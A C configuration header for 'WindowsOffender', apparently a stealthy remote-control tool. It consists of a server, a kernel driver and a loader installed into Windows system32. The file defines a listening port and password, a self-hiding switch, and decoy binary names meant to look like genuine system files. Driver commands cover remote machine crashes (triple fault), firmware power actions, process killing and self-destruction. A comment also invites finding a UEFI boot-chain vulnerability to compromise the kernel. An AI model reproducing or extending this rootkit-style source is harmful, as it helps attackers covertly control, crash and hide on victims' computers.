#pragma once

/*--- Configuration part ---*/

/* The server password/key used for panel-server communication, can be smaller than 256 bit but can't exceed it.
   Please pick a decent one :) if the password is longer than 32 bytes (256 bit) the server will not function, its literally
   the first sanity check that the server does. if the password is smaller, the other bytes after it will be zeroed.
*/
#define SERVER_PASSWORD ""

/* The port that the server will listen on */
#define SERVER_PORT 6969

/* Whether WindowsOffender should hide itself */
#define HIDEMYASS 0

/* Whether the binaries should have the default names, only enable if you don't need self-hiding */
#define USE_DEFAULT_NAMES 1

/*Adjust based on where you want the windowsoffender installer to install the binaries,
  BACKSLASH AT THE END IS REQUIRED!!! MUST be a valid full native path*/
#define INSTALLATION_PATH "\\SystemRoot\\system32\\"
#define DRIVER_INSTALLATION_PATH "\\SystemRoot\\system32\\drivers\\"

/*
Currently we hardcode all paths, this should be fine.
We pick some random shit names that might look like legit files (security by obscurity),
make sure to change these if you build windowsoffender. Even though it hides itself, some side effects exist
and an offline disk analysis can be done easily anyways, if someone knows what they're doing they can easily
find windowsoffender if its installed on their machine but if you want to you can find a new CVE in the UEFI
windows trusted bootchain, write a mechanism for windowsoffender to compromise the kernel, load its driver 
and do a pull req
*/
#if USE_DEFAULT_NAMES

   // Default names 

   #define SERVER_NAME "WindowsOffenderServer"

   #define DRIVER_NAME "WindowsOffenderDriver"

   #define DRIVER_LOADER_NAME "WindowsOffenderDriverLoader"

#else

   // "Obscurity" names

   #define SERVER_NAME "UserInputHostExperience" 

   #define DRIVER_NAME "wdmlibso"

   #define DRIVER_LOADER_NAME "xmmresg"

#endif

/*--- End of configuration part ---*/





#define WIDE_STRING_INTERNAL(x) L##x
#define WIDE_STRING(x) WIDE_STRING_INTERNAL(x)


#define SERVER_IMAGE_PATH        INSTALLATION_PATH SERVER_NAME ".exe"
#define DRIVER_IMAGE_PATH        DRIVER_INSTALLATION_PATH DRIVER_NAME ".sys"
#define DRIVER_LOADER_IMAGE_PATH INSTALLATION_PATH DRIVER_LOADER_NAME ".exe"


// Wide string versions of the above macros
#define WIDE_SERVER_IMAGE_PATH WIDE_STRING(INSTALLATION_PATH) WIDE_STRING(SERVER_NAME) L".exe"
#define WIDE_SERVER_NAME WIDE_STRING(SERVER_NAME)

#define WIDE_DRIVER_IMAGE_PATH WIDE_STRING(DRIVER_INSTALLATION_PATH) WIDE_STRING(DRIVER_NAME) L".sys"
#define WIDE_DRIVER_NAME WIDE_STRING(DRIVER_NAME)

#define WIDE_DRIVER_LOADER_IMAGE_PATH WIDE_STRING(INSTALLATION_PATH) WIDE_STRING(DRIVER_LOADER_NAME) L".exe"
#define WIDE_DRIVER_LOADER_NAME WIDE_STRING(DRIVER_LOADER_NAME)

/*
WindowsOffender IOCTL codes used for driver-server communication
*/
#define WINDOWSOFFENDER_CTL_CODE(Code) CTL_CODE(FILE_DEVICE_UNKNOWN, Code, METHOD_BUFFERED, FILE_ANY_ACCESS)

// IOCTLs with no special return data start from 0x800
#define IOCTL_FIRMWAREPOWER			WINDOWSOFFENDER_CTL_CODE(0x800)
#define IOCTL_TRIPLE_FAULT          WINDOWSOFFENDER_CTL_CODE(0x801)
#define IOCTL_TERMINATEPROCESS		WINDOWSOFFENDER_CTL_CODE(0x802)

// IOCTLs that return data to the client start from 0xA00
#define IOCTL_REQUESTPROCESSLIST	   WINDOWSOFFENDER_CTL_CODE(0xA00)

// Special selfdestroy IOCTL code that uninstalls WindowsOffender from the machine
#define IOCTL_SELFDESTROY			   WINDOWSOFFENDER_CTL_CODE(0xDED)

// Internal IOCTLs start from 0xF00
#define IOCTL_INITIALIZE_FILTERING	WINDOWSOFFENDER_CTL_CODE(0xF00)

#ifdef DEBUG
#define IOCTL_DEBUGTEST				   WINDOWSOFFENDER_CTL_CODE(0xFFF)
#endif